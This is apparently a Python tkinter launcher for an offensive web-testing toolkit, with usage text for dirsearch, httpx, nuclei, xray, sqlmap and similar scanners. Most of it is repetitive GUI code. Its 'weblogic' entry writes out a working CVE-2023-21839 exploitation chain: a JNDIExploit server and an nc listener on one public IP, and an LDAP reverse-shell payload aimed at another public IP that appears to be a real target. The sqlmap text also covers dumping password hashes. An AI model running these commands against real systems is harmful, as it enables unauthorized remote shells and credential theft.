import tkinter as tk
import subprocess
from tkinter import ttk
from tkinter import messagebox
import os
import sv_ttk

# 定义一个点击后布局 file_path要写文件夹名称
def buju(file_path, tool_name, tool_introduce, tool_usage_method, tool_use_commond, run_cmd):
    # 删除text中所有内容
    text.delete("1.0", tk.END)
    file_path = r"file\{}".format(file_path)
    text.insert(tk.INSERT,
                tree.item(item, "text") + "位置在：{}\n".format(file_path) + "{}介绍：\n{}\n\n使用方法：\n{}".format(tool_name, tool_introduce, tool_usage_method))
    print(tree.item(item, "text"))
    # 使用命令
    if text1.get("1.0",
                 tk.END).strip() != "{}".format(tool_use_commond):
        text1.delete("1.0", tk.END)
        text1.insert(tk.INSERT, """{}""".format(tool_use_commond))
    # 按钮功能
    # 写入文件
    Button1 = tk.Button(root, text="写入文件", font=("宋体", 15), command=lambda: wrint_in(name=file_path + r"\1.txt"))
    Button1.place(relx=0.2, rely=0.61, relwidth=0.2, relheight=0.06)

    # 复制命令
    Button2 = tk.Button(root, text="复制命令", font=("宋体", 15), command=copy_to_clipboard)
    Button2.place(relx=0.4, rely=0.61, relwidth=0.2, relheight=0.06)

    # 打开cmd窗口
    # 一般来说是路径
    Button3 = tk.Button(root, text="打开cmd", font=("宋体", 15), command=lambda: open_cmd_window(run_cmd))
    Button3.place(relx=0.6, rely=0.61, relwidth=0.2, relheight=0.06)

    # 打开结果文件夹必须要绝对路径
    result_path = os.getcwd() + r"\{}".format(file_path)
    # print(result_path)
    Button4 = tk.Button(root, text="打开结果文件夹", font=("宋体", 15), command=lambda: open_dirctory(result_path))
    Button4.place(relx=0.8, rely=0.61, relwidth=0.2, relheight=0.06)


def wrint_in(name):
    # 将第一个文本框内容写入
    text2.delete("1.0", tk.END)
    text2.insert("1.0", "内容写入到 --> {}".format(name))
    lists = text.get("1.0", tk.END).strip("\n").split("\n")
    with open("{}".format(name), "w", encoding="utf8") as f:
        for i in lists:
            f.write(i + "\n")


def copy_to_clipboard():
    # 获取文本框中的内容
    text = text1.get("1.0", "end-1c")
    # 复制内容到剪贴板
    root.clipboard_clear()
    root.clipboard_append(text)


# 打开CMD并保存cmd处于开启
def open_cmd_window(filepath):
    # 使用Popen函数启动新的cmd进程
    cmd = "cd {}".format(filepath)
    process = subprocess.Popen(['start', 'cmd', '/k', '{}'.format(cmd)], shell=True)
    process.wait()
    # 解决关闭后主窗口会隐藏的状态
    # 置顶窗口
    root.attributes("-topmost", True)
    # 关闭置状态
    root.attributes("-topmost", False)


# 打开文件夹
def open_dirctory(directory):
    subprocess.Popen(f'explorer.exe {directory}')


def on_closing():
    if messagebox.askokcancel("提示信息", "你确定退出吗?"):
        root.destroy()


class ShowContent:
    def __init__(self, file_path, tool_name, tool_introduce, tool_usage_method, tool_use_commond, run_cmd,wrint_name,cmd_filepath,directory):
        self.file_path = file_path
        self.tool_name = tool_name
        self.tool_introduce = tool_introduce
        self.tool_usage_method = tool_usage_method
        self.tool_use_commond = tool_use_commond
        self.run_cmd = run_cmd
        self.wrint_name = wrint_name
        self.cmd_filepath = cmd_filepath
        self.directory = directory

    def wrint_in(self):
        # 将第一个文本框内容写入
        text2.delete("1.0", tk.END)
        text2.insert("1.0", "内容写入到 --> {}".format(self.wrint_name))
        lists = text.get("1.0", tk.END).strip("\n").split("\n")
        with open("{}".format(self.wrint_name), "w", encoding="utf8") as f:
            for i in lists:
                f.write(i + "\n")

    def copy_to_clipboard(self):
        # 获取文本框中的内容
        text = text1.get("1.0", "end-1c")
        # 复制内容到剪贴板
        root.clipboard_clear()
        root.clipboard_append(text)

    # 打开CMD并保存cmd处于开启
    def open_cmd_window(self):
        # 使用Popen函数启动新的cmd进程
        cmd = "cd {}".format(self.cmd_filepath)
        process = subprocess.Popen(['start', 'cmd', '/k', '{}'.format(cmd)], shell=True)
        process.wait()
        # 解决关闭后主窗口会隐藏的状态
        # 置顶窗口
        root.attributes("-topmost", True)
        # 关闭置状态
        root.attributes("-topmost", False)

    # 打开文件夹
    def open_dirctory(self):
        subprocess.Popen(f'explorer.exe {self.directory}')

    # 定义一个点击后布局 file_path要写文件夹名称
    def buju(self):
        file_path = r"file\{}".format(self.file_path)
        text.delete("1.0", tk.END)
        text.insert(tk.INSERT,
                    tree.item(item, "text") + "位置在：{}\n".format(file_path) + "{}介绍：\n{}\n\n使用方法：\n{}".format(self.tool_name,
                                                                                                             self.tool_introduce,
                                                                                                             self.tool_usage_method))
        print(tree.item(item, "text"))
        # 使用命令
        if text1.get("1.0",
                     tk.END).strip() != "{}".format(self.tool_use_commond):
            text1.delete("1.0", tk.END)
            text1.insert(tk.INSERT, """{}""".format(self.tool_use_commond))
        # 按钮功能
        # 写入文件

        Button1 = tk.Button(root, text="写入文件", font=("宋体", 15),
                            command=lambda: self.wrint_in())
        Button1.place(relx=0.2, rely=0.61, relwidth=0.2, relheight=0.06)

        # 复制命令
        Button2 = tk.Button(root, text="复制命令", font=("宋体", 15), command=self.copy_to_clipboard)
        Button2.place(relx=0.4, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开cmd窗口
        # 一般来说是路径
        Button3 = tk.Button(root, text="打开cmd", font=("宋体", 15), command=lambda: self.open_cmd_window())
        Button3.place(relx=0.6, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开结果文件夹必须要绝对路径
        # result_path = os.getcwd() + r"\{}".format(file_path)
        # # print(result_path)
        Button4 = tk.Button(root, text="打开结果文件夹", font=("宋体", 15), command=lambda: self.open_dirctory())
        Button4.place(relx=0.8, rely=0.61, relwidth=0.2, relheight=0.06)


# 事件处理函数，在点击时显示点击内容
def show_text(event):
    item = tree.selection()[0]
    # 文件夹在
    text.delete("1.0", "end")
    # tree.item(item, "text") 获取单击树枝名字
    name = tree.item(item, "text")
    # 点击名称spider_fofa
    show_connect(name)

# 定义显示函数
def show_connect(name):
    if name == "spider_fofa":
        filepath = r"file\spider_fofa"
        wrint_name = r"file\spider_fofa\1.txt"
        tool_name = "spider_fofa"
        tool_introduce = "spider_fofa介绍：\n是从fofa上爬取url!\n开发者苏长御!思路提供者F3sengzi\n请在此输入域名或IP：每行一个。"
        tool_usage_method = "打开cmd运行"
        tool_use_commond = "python spider_fofa.py"
        run_cmd = "python spider_fofa.py"
        cmd_filepath = r"file\spider_fofa"
        directory = filepath
        spider_fofa = ShowContent(file_path=filepath, tool_name=tool_name, tool_introduce=tool_introduce,
                                  tool_usage_method=tool_usage_method, tool_use_commond=tool_use_commond,
                                  run_cmd=run_cmd, wrint_name=wrint_name, cmd_filepath=cmd_filepath,
                                  directory=directory)
        spider_fofa.buju()


    # dirsearch
    elif name == "dirsearch":
        filepath = r"file\dirsearch"
        wrint_name = r"file\dirsearch\1.txt"
        tool_name = "dirsearch"
        tool_introduce = "dirsearch：\n从apk中获取敏感信息"
        tool_usage_method = """
    dirsearch介绍：
    一款开源的强大目录扫描工具使用方式：在此处输入待扫描的url，一行一个点击写入文件，复制命令，打开cmd窗口执行完毕后打开结果文件夹
    最常用命令：python dirsearch.py -l 1.txt -w db/payload-src.txt -x 301,400-499,500-599  --max-rate=120
    python dirsearch.py -l 1.txt -e * -x 301,400-499,500-599  --max-rate=120
    python dirsearch.py -l 1.txt -w db/fast_src_payload.txt
    无法扫描目录时参数：--proxy=http://127.0.0.1:8080
    --timeout 控制每个URL的最大运行时间 时间秒
    -t 控制每个请求的超时时间 时间秒
            """
        tool_use_commond = "python dirsearch.py -l 1.txt -w db/fast_src_payload.txt"
        run_cmd = "python dirsearch.py -l 1.txt -w db/fast_src_payload.txt"
        cmd_filepath = r"file\dirsearch"
        directory = filepath
        spider_fofa = ShowContent(file_path=filepath, tool_name=tool_name, tool_introduce=tool_introduce,
                                  tool_usage_method=tool_usage_method, tool_use_commond=tool_use_commond,
                                  run_cmd=run_cmd, wrint_name=wrint_name, cmd_filepath=cmd_filepath,
                                  directory=directory)
        spider_fofa.buju()

    # httpx
    elif name == "httpx":
        file_path = r"file\httpx"
        text.insert(tk.INSERT, name + r"位置在：{}".format(
            file_path) + "httpx介绍：\n一款强大的开源的存活探测检测工具\n\n使用方式：在此处输入待探测的url，一行一个\n点击写入文件，复制命令，打开cmd窗口执行完毕后打开结果文件夹"
                         "\n\n最常用命令：\ntype 1.txt | httpx -title -status-code -ip -follow-redirects -no-color  -content-length  -o 1_alive.txt"
                         "\n参数：\n-http-proxy http://127.0.0.1:8080"
                         "\nhttpx -l 1.txt -favicon -o 2.txt -no-color 探测hash")
        # 使用命令
        if text1.get("1.0",
                     tk.END).strip() != "httpx -l 1.txt -title -status-code -ip -follow-redirects -no-color  -content-length  -favicon -o 1_alive.txt":
            text1.delete("1.0", tk.END)
            text1.insert(tk.INSERT,
                         """httpx -l 1.txt -title -status-code -ip -follow-redirects -no-color  -content-length  -favicon -o 1_alive.txt""".format(
                             file_path))
        # 按钮功能
        # 写入文件
        Button1 = tk.Button(root, text="写入文件", font=("宋体", 15), command=lambda: wrint_in(name=file_path + r"\1.txt"))
        Button1.place(relx=0.2, rely=0.61, relwidth=0.2, relheight=0.06)

        # 复制命令
        Button2 = tk.Button(root, text="复制命令", font=("宋体", 15), command=copy_to_clipboard)
        Button2.place(relx=0.4, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开cmd窗口
        Button3 = tk.Button(root, text="打开CMD", font=("宋体", 15), command=lambda: open_cmd_window(file_path))
        Button3.place(relx=0.6, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开结果文件夹必须要绝对路径
        result_path = os.getcwd() + "\{}".format(file_path)
        Button4 = tk.Button(root, text="打开结果文件夹", font=("宋体", 15), command=lambda: open_dirctory(result_path))
        Button4.place(relx=0.8, rely=0.61, relwidth=0.2, relheight=0.06)
    # rad_windows_amd64
    elif name == "rad_windows":
        file_path = r"file\rad_windows_amd64"
        text.insert(tk.INSERT, name + r"位置在：{}".format(
            file_path) + "rad_windows_amd64介绍：\n一款强大的爬虫工具\n\n使用方式：在此处输入待探测的url，一行一个\n点击写入文件，复制命令，打开cmd窗口执行完毕后打开结果文件夹\ncount.py文件夹中是获取所有的探测url保存至tmp.txt中"
                         "\n\n最常用命令：\npython rad_burp.py 1.txt")
        # 使用命令
        if text1.get("1.0",
                     tk.END).strip() != "python rad_burp.py 1.txt":
            text1.delete("1.0", tk.END)
            text1.insert(tk.INSERT,
                         """del /s /q "out\*.txt" && python rad_burp.py 1.txt && python count.py""".format(
                             file_path))
        # 按钮功能
        # 写入文件
        Button1 = tk.Button(root, text="写入文件", font=("宋体", 15), command=lambda: wrint_in(name=file_path + r"\1.txt"))
        Button1.place(relx=0.2, rely=0.61, relwidth=0.2, relheight=0.06)

        # 复制命令
        Button2 = tk.Button(root, text="复制命令", font=("宋体", 15), command=copy_to_clipboard)
        Button2.place(relx=0.4, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开cmd窗口
        Button3 = tk.Button(root, text="打开CMD", font=("宋体", 15), command=lambda: open_cmd_window(file_path))
        Button3.place(relx=0.6, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开结果文件夹必须要绝对路径
        result_path = os.getcwd() + "\{}".format(file_path)
        Button4 = tk.Button(root, text="打开结果文件夹", font=("宋体", 15), command=lambda: open_dirctory(result_path))
        Button4.place(relx=0.8, rely=0.61, relwidth=0.2, relheight=0.06)
    # 小米范
    elif name == "小米范":
        file_path = r"file\小米范工具"
        text.insert(tk.INSERT, name + r"位置在：{}".format(
            file_path) + "小米范介绍：\n包含目录扫描，网站发现，目录爆破，存活扫描\n\n使用方式:\n打开结果文件夹")
        # 使用命令
        if text1.get("1.0",
                     tk.END).strip() != "无":
            text1.delete("1.0", tk.END)
            text1.insert(tk.INSERT,
                         """无""".format(
                             file_path))
        # 按钮功能
        # 写入文件
        Button1 = tk.Button(root, text="写入文件", font=("宋体", 15), command=lambda: wrint_in(name=file_path + r"\1.txt"))
        Button1.place(relx=0.2, rely=0.61, relwidth=0.2, relheight=0.06)

        # 复制命令
        Button2 = tk.Button(root, text="复制命令", font=("宋体", 15), command=copy_to_clipboard)
        Button2.place(relx=0.4, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开cmd窗口
        Button3 = tk.Button(root, text="打开CMD", font=("宋体", 15), command=lambda: open_cmd_window(file_path))
        Button3.place(relx=0.6, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开结果文件夹必须要绝对路径
        result_path = os.getcwd() + "\{}".format(file_path)
        Button4 = tk.Button(root, text="打开结果文件夹", font=("宋体", 15), command=lambda: open_dirctory(result_path))
        Button4.place(relx=0.8, rely=0.61, relwidth=0.2, relheight=0.06)

    # ehole
    elif name == "Ehole3.0-Win":
        file_path = r"file\Ehole3.0-Win"
        text.insert(tk.INSERT, name + r"位置在：{}".format(
            file_path) + "Ehole3.0-Win介绍：\n强大的指纹识别工具\n\n使用方式:\n在此处输入待探测的url，一行一个\n写入文件\n复制命令\n打开cmd窗口运行")
        # 使用命令
        if text1.get("1.0",
                     tk.END).strip() != "ehole.exe finger -l 1.txt":
            text1.delete("1.0", tk.END)
            text1.insert(tk.INSERT,
                         """ehole.exe finger -l 1.txt""".format(
                             file_path))
        # 按钮功能
        # 写入文件
        Button1 = tk.Button(root, text="写入文件", font=("宋体", 15), command=lambda: wrint_in(name=file_path + r"\1.txt"))
        Button1.place(relx=0.2, rely=0.61, relwidth=0.2, relheight=0.06)

        # 复制命令
        Button2 = tk.Button(root, text="复制命令", font=("宋体", 15), command=copy_to_clipboard)
        Button2.place(relx=0.4, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开cmd窗口
        Button3 = tk.Button(root, text="打开CMD", font=("宋体", 15), command=lambda: open_cmd_window(file_path))
        Button3.place(relx=0.6, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开结果文件夹必须要绝对路径
        result_path = os.getcwd() + "\{}".format(file_path)
        Button4 = tk.Button(root, text="打开结果文件夹", font=("宋体", 15), command=lambda: open_dirctory(result_path))
        Button4.place(relx=0.8, rely=0.61, relwidth=0.2, relheight=0.06)

    # nuclei
    elif name == "nuclei":
        file_path = r"file\nuclei_2.7.1_windows_amd64"
        text.insert(tk.INSERT, name + r"位置在：{}".format(
            file_path) + "nuclei介绍：\n强大的漏洞扫描工具主要针对CVE漏洞进行扫描\n\n使用方式:\n在此处输入待探测的url，一行一个\n写入文件\n复制命令\n打开cmd窗口运行")
        # 使用命令
        if text1.get("1.0",
                     tk.END).strip() != "nuclei -l 1.txt -s unknown,critical,high,medium,low -o result.txt\n-resume string ,断点继续扫描":
            text1.delete("1.0", tk.END)
            text1.insert(tk.INSERT,
                         """nuclei -l 1.txt -s unknown,critical,high,medium,low -o result.txt""".format(
                             file_path))
        # 按钮功能
        # 写入文件
        Button1 = tk.Button(root, text="写入文件", font=("宋体", 15), command=lambda: wrint_in(name=file_path + r"\1.txt"))
        Button1.place(relx=0.2, rely=0.61, relwidth=0.2, relheight=0.06)

        # 复制命令
        Button2 = tk.Button(root, text="复制命令", font=("宋体", 15), command=copy_to_clipboard)
        Button2.place(relx=0.4, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开cmd窗口
        Button3 = tk.Button(root, text="打开CMD", font=("宋体", 15), command=lambda: open_cmd_window(file_path))
        Button3.place(relx=0.6, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开结果文件夹必须要绝对路径
        result_path = os.getcwd() + "\{}".format(file_path)
        Button4 = tk.Button(root, text="打开结果文件夹", font=("宋体", 15), command=lambda: open_dirctory(result_path))
        Button4.place(relx=0.8, rely=0.61, relwidth=0.2, relheight=0.06)

    # Xray
    elif name == "xray":
        file_path = r"file\xray"
        text.insert(tk.INSERT, name + "位置在：{}\n".format(
            file_path) + "xray介绍：\n强大的漏洞扫描工具针对漏洞进行扫描,支持主动扫描和被动扫描\n\n使用方式:\n主动扫描："
                         "\nxray_windows_amd64.exe webscan --basic-crawler http://192.168.44.135/pikachu/ --html-output pikachu.html"
                         "\n被动扫描：\nxray webscan --listen 127.0.0.1:9898 --html-output xxx.html")
        # 使用命令
        if text1.get("1.0",
                     tk.END).strip() != "xray webscan --listen 127.0.0.1:9898 --html-output xxx.html":
            text1.delete("1.0", tk.END)
            text1.insert(tk.INSERT,
                         """xray webscan --listen 127.0.0.1:9898 --html-output xxx.html""".format(
                             file_path))
        # 按钮功能
        # 写入文件
        Button1 = tk.Button(root, text="写入文件", font=("宋体", 15), command=lambda: wrint_in(name=file_path + r"\1.txt"))
        Button1.place(relx=0.2, rely=0.61, relwidth=0.2, relheight=0.06)

        # 复制命令
        Button2 = tk.Button(root, text="复制命令", font=("宋体", 15), command=copy_to_clipboard)
        Button2.place(relx=0.4, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开cmd窗口
        Button3 = tk.Button(root, text="打开CMD", font=("宋体", 15), command=lambda: open_cmd_window(file_path))
        Button3.place(relx=0.6, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开结果文件夹必须要绝对路径
        result_path = os.getcwd() + "\{}".format(file_path)
        Button4 = tk.Button(root, text="打开结果文件夹", font=("宋体", 15), command=lambda: open_dirctory(result_path))
        Button4.place(relx=0.8, rely=0.61, relwidth=0.2, relheight=0.06)

    # vulmap
    elif name == "vulmap":
        file_path = r"file\vulmap-main"
        text.insert(tk.INSERT, name + "位置在：{}\n".format(
            file_path) + "vulmap介绍：\n强大的漏洞扫描工具针对漏洞进行扫描\n\n使用方式:\n在此处输入待探测的url，一行一个\n写入文件\n复制命令\n打开cmd窗口运行\n\n扫描命令"
                         "\npython vulmap.py -f 1.txt --output-text results.txt")
        # 使用命令
        if text1.get("1.0",
                     tk.END).strip() != "python vulmap.py -f 1.txt --output-text results.txt":
            text1.delete("1.0", tk.END)
            text1.insert(tk.INSERT,
                         """python vulmap.py -f 1.txt --output-text results.txt""".format(
                             file_path))
        # 按钮功能
        # 写入文件
        Button1 = tk.Button(root, text="写入文件", font=("宋体", 15), command=lambda: wrint_in(name=file_path + r"\1.txt"))
        Button1.place(relx=0.2, rely=0.61, relwidth=0.2, relheight=0.06)

        # 复制命令
        Button2 = tk.Button(root, text="复制命令", font=("宋体", 15), command=copy_to_clipboard)
        Button2.place(relx=0.4, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开cmd窗口
        Button3 = tk.Button(root, text="打开CMD", font=("宋体", 15), command=lambda: open_cmd_window(file_path))
        Button3.place(relx=0.6, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开结果文件夹必须要绝对路径
        result_path = os.getcwd() + "\{}".format(file_path)
        Button4 = tk.Button(root, text="打开结果文件夹", font=("宋体", 15), command=lambda: open_dirctory(result_path))
        Button4.place(relx=0.8, rely=0.61, relwidth=0.2, relheight=0.06)

    # packer-fuzz
    elif name == "packer-fuzz":
        file_path = r"file\Packer-Fuzzer-1.4"
        text.insert(tk.INSERT, name + "位置在：{}\n".format(
            file_path) + "packer-fuzz介绍：\n一款针对webpacker扫描的工具\n\n"
                         "使用方法：\n自己修改如下命令，打开cmd窗口进行扫描"
                         "\n\n帮助文档："
                         "\n -c COOKIE, --cookie=COOKIE"
                         "\n -p PROXY, --proxy=http://127.0.0.1:8080")
        # 使用命令
        if text1.get("1.0",
                     tk.END).strip() != "python PackerFuzzer.py -u https://www.baidu.com -f 1":
            text1.delete("1.0", tk.END)
            text1.insert(tk.INSERT,
                         """python PackerFuzzer.py -u https://www.baidu.com -f 1""".format(
                             file_path))
        # 按钮功能
        # 写入文件
        Button1 = tk.Button(root, text="写入文件", font=("宋体", 15), command=lambda: wrint_in(name=file_path + r"\1.txt"))
        Button1.place(relx=0.2, rely=0.61, relwidth=0.2, relheight=0.06)

        # 复制命令
        Button2 = tk.Button(root, text="复制命令", font=("宋体", 15), command=copy_to_clipboard)
        Button2.place(relx=0.4, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开cmd窗口
        Button3 = tk.Button(root, text="打开CMD", font=("宋体", 15), command=lambda: open_cmd_window(file_path))
        Button3.place(relx=0.6, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开结果文件夹必须要绝对路径
        result_path = os.getcwd() + r"\{}\reports".format(file_path)
        Button4 = tk.Button(root, text="打开结果文件夹", font=("宋体", 15), command=lambda: open_dirctory(result_path))
        Button4.place(relx=0.8, rely=0.61, relwidth=0.2, relheight=0.06)

    # packer-fuzz
    elif name == "packer-fuzz":
        file_path = r"file\Packer-Fuzzer-1.4"
        text.insert(tk.INSERT, name + "位置在：{}\n".format(
            file_path) + "packer-fuzz介绍：\n一款针对webpacker扫描的工具\n\n"
                         "使用方法：\n自己修改如下命令，打开cmd窗口进行扫描"
                         "\n\n扫描命令："
                         "\npython PackerFuzzer.py -u https://www.baidu.com -f 1")
        # 使用命令
        if text1.get("1.0",
                     tk.END).strip() != "python PackerFuzzer.py -u https://www.baidu.com -f 1":
            text1.delete("1.0", tk.END)
            text1.insert(tk.INSERT,
                         """python PackerFuzzer.py -u https://www.baidu.com -f 1""".format(
                             file_path))
        # 按钮功能
        # 写入文件
        Button1 = tk.Button(root, text="写入文件", font=("宋体", 15), command=lambda: wrint_in(name=file_path + r"\1.txt"))
        Button1.place(relx=0.2, rely=0.61, relwidth=0.2, relheight=0.06)

        # 复制命令
        Button2 = tk.Button(root, text="复制命令", font=("宋体", 15), command=copy_to_clipboard)
        Button2.place(relx=0.4, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开cmd窗口
        Button3 = tk.Button(root, text="打开CMD", font=("宋体", 15), command=lambda: open_cmd_window(file_path))
        Button3.place(relx=0.6, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开结果文件夹必须要绝对路径
        result_path = os.getcwd() + r"\{}\reports".format(file_path)
        Button4 = tk.Button(root, text="打开结果文件夹", font=("宋体", 15), command=lambda: open_dirctory(result_path))
        Button4.place(relx=0.8, rely=0.61, relwidth=0.2, relheight=0.06)

    # ueditor
    elif name == "ueditor(net)":
        file_path = r"file\ueditor"
        text.insert(tk.INSERT, name + "位置在：{}\n".format(
            file_path) + "ueditor介绍：\n一款针对ueditor(net)的文件上传工具\n\n"
                         "使用方法：\n打开目录进行上传"
                         "\n\n扫描命令："
                         "\n无")
        # 使用命令
        if text1.get("1.0",
                     tk.END).strip() != "无":
            text1.delete("1.0", tk.END)
            text1.insert(tk.INSERT,
                         """无""".format(
                             file_path))
        # 按钮功能
        # 写入文件
        Button1 = tk.Button(root, text="写入文件", font=("宋体", 15), command=lambda: wrint_in(name=file_path + r"\1.txt"))
        Button1.place(relx=0.2, rely=0.61, relwidth=0.2, relheight=0.06)

        # 复制命令
        Button2 = tk.Button(root, text="复制命令", font=("宋体", 15), command=copy_to_clipboard)
        Button2.place(relx=0.4, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开cmd窗口
        Button3 = tk.Button(root, text="打开CMD", font=("宋体", 15), command=lambda: open_cmd_window(file_path))
        Button3.place(relx=0.6, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开结果文件夹必须要绝对路径
        result_path = os.getcwd() + r"\{}".format(file_path)
        Button4 = tk.Button(root, text="打开结果文件夹", font=("宋体", 15), command=lambda: open_dirctory(result_path))
        Button4.place(relx=0.8, rely=0.61, relwidth=0.2, relheight=0.06)

    # sqlmap
    elif name == "sqlmap":
        file_path = r"file\sqlmap-1.7"
        text.insert(tk.INSERT, name + "位置在：{}\n".format(
            file_path) + "sqlmap介绍：\n一款针对注入点检测的工具\n\n"
                         "使用方法：\n将数据包复制到该处\n写入文件\n复制命令\n打开cmd\n运行"
                         "\n\n常用帮助文档："
                         "\n--technique=BEUSTQ "
                         "\n--proxy http://127.0.0.1:8080 "
                         "\n--level 1-5"
                         "\n--current-user 当前用户名"
                         "\n--passwords  枚举 DBMS users password hashes"
                         "\n--flush-session 刷新缓存"
                         "\n--dbms DBMS 指定数据库类型mysql oracle mssql postgres sqlite")
        # 使用命令
        if text1.get("1.0",
                     tk.END).strip() != "python sqlmap.py -r 1.txt --level 3 ":
            text1.delete("1.0", tk.END)
            text1.insert(tk.INSERT,
                         """python sqlmap.py -r 1.txt --level 3 """.format(
                             file_path))
        # 按钮功能
        # 写入文件
        Button1 = tk.Button(root, text="写入文件", font=("宋体", 15), command=lambda: wrint_in(name=file_path + r"\1.txt"))
        Button1.place(relx=0.2, rely=0.61, relwidth=0.2, relheight=0.06)

        # 复制命令
        Button2 = tk.Button(root, text="复制命令", font=("宋体", 15), command=copy_to_clipboard)
        Button2.place(relx=0.4, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开cmd窗口
        Button3 = tk.Button(root, text="打开CMD", font=("宋体", 15), command=lambda: open_cmd_window(file_path))
        Button3.place(relx=0.6, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开结果文件夹必须要绝对路径
        result_path = os.getcwd() + r"\{}".format(file_path)
        Button4 = tk.Button(root, text="打开结果文件夹", font=("宋体", 15), command=lambda: open_dirctory(result_path))
        Button4.place(relx=0.8, rely=0.61, relwidth=0.2, relheight=0.06)

    # thinkphp
    elif name == "thinkphp":
        file_path = r"file\thinkphp"
        text.insert(tk.INSERT, name + "位置在：{}\n".format(
            file_path) + "thinkphp介绍：\n四个工具检测thinkphp全家桶漏洞\n\n"
                         "使用方法：\n打开文件夹")
        # 使用命令
        if text1.get("1.0",
                     tk.END).strip() != "无":
            text1.delete("1.0", tk.END)
            text1.insert(tk.INSERT,
                         """无""".format(
                             file_path))
        # 按钮功能
        # 写入文件
        Button1 = tk.Button(root, text="写入文件", font=("宋体", 15), command=lambda: wrint_in(name=file_path + r"\1.txt"))
        Button1.place(relx=0.2, rely=0.61, relwidth=0.2, relheight=0.06)

        # 复制命令
        Button2 = tk.Button(root, text="复制命令", font=("宋体", 15), command=copy_to_clipboard)
        Button2.place(relx=0.4, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开cmd窗口
        Button3 = tk.Button(root, text="打开CMD", font=("宋体", 15), command=lambda: open_cmd_window(file_path))
        Button3.place(relx=0.6, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开结果文件夹必须要绝对路径
        result_path = os.getcwd() + r"\{}".format(file_path)
        Button4 = tk.Button(root, text="打开结果文件夹", font=("宋体", 15), command=lambda: open_dirctory(result_path))
        Button4.place(relx=0.8, rely=0.61, relwidth=0.2, relheight=0.06)

    # struts2
    elif name == "struts2":
        file_path = r"file\struts2"
        text.insert(tk.INSERT, name + "位置在：{}\n".format(
            file_path) + "struts2介绍：\n两个工具检测strtus2漏洞\n\n"
                         "使用方法：\n打开文件夹")
        # 使用命令
        if text1.get("1.0",
                     tk.END).strip() != "无":
            text1.delete("1.0", tk.END)
            text1.insert(tk.INSERT,
                         """无""".format(
                             file_path))
        # 按钮功能
        # 写入文件
        Button1 = tk.Button(root, text="写入文件", font=("宋体", 15), command=lambda: wrint_in(name=file_path + r"\1.txt"))
        Button1.place(relx=0.2, rely=0.61, relwidth=0.2, relheight=0.06)

        # 复制命令
        Button2 = tk.Button(root, text="复制命令", font=("宋体", 15), command=copy_to_clipboard)
        Button2.place(relx=0.4, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开cmd窗口
        Button3 = tk.Button(root, text="打开CMD", font=("宋体", 15), command=lambda: open_cmd_window(file_path))
        Button3.place(relx=0.6, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开结果文件夹必须要绝对路径
        result_path = os.getcwd() + r"\{}".format(file_path)
        Button4 = tk.Button(root, text="打开结果文件夹", font=("宋体", 15), command=lambda: open_dirctory(result_path))
        Button4.place(relx=0.8, rely=0.61, relwidth=0.2, relheight=0.06)

    # springboot
    elif name == "springboot":
        file_path = r"file\springboot"
        text.insert(tk.INSERT, name + "位置在：{}\n".format(
            file_path) + "springboot介绍：\n两个工具检测springboot漏洞\n\n"
                         "使用方法：\n打开文件夹,里面可能藏着一些好东西")
        # 使用命令
        if text1.get("1.0",
                     tk.END).strip() != "无":
            text1.delete("1.0", tk.END)
            text1.insert(tk.INSERT,
                         """无""".format(
                             file_path))
        # 按钮功能
        # 写入文件
        Button1 = tk.Button(root, text="写入文件", font=("宋体", 15), command=lambda: wrint_in(name=file_path + r"\1.txt"))
        Button1.place(relx=0.2, rely=0.61, relwidth=0.2, relheight=0.06)

        # 复制命令
        Button2 = tk.Button(root, text="复制命令", font=("宋体", 15), command=copy_to_clipboard)
        Button2.place(relx=0.4, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开cmd窗口
        Button3 = tk.Button(root, text="打开CMD", font=("宋体", 15), command=lambda: open_cmd_window(file_path))
        Button3.place(relx=0.6, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开结果文件夹必须要绝对路径
        result_path = os.getcwd() + r"\{}".format(file_path)
        Button4 = tk.Button(root, text="打开结果文件夹", font=("宋体", 15), command=lambda: open_dirctory(result_path))
        Button4.place(relx=0.8, rely=0.61, relwidth=0.2, relheight=0.06)

    # weblogic
    elif name == "weblogic":
        file_path = r"file\weblogic"
        text.insert(tk.INSERT, name + "位置在：{}\n".format(
            file_path) + "weblogic介绍：\n四个工具检测weblogic漏洞\n\n"
                         "使用方法：\n打开文件夹\n\nWeblogic-CVE-2023-21839:\n开启服务java -jar JNDIExploit-1.4-SNAPSHOT.jar  -i 39.96.57.98"
                         "\n开启监听nc -lvnp 6632"
                         "\n使用工具进行利用，在服务端查看返回的shell  java -jar Weblogic-CVE-2023-21839.jar 220.248.160.253:9022  ldap://39.96.57.98:1389/Basic/ReverseShell/39.96.57.98/6632")
        # 使用命令
        if text1.get("1.0",
                     tk.END).strip() != "无":
            text1.delete("1.0", tk.END)
            text1.insert(tk.INSERT,
                         """无""".format(
                             file_path))
        # 按钮功能
        # 写入文件
        Button1 = tk.Button(root, text="写入文件", font=("宋体", 15), command=lambda: wrint_in(name=file_path + r"\1.txt"))
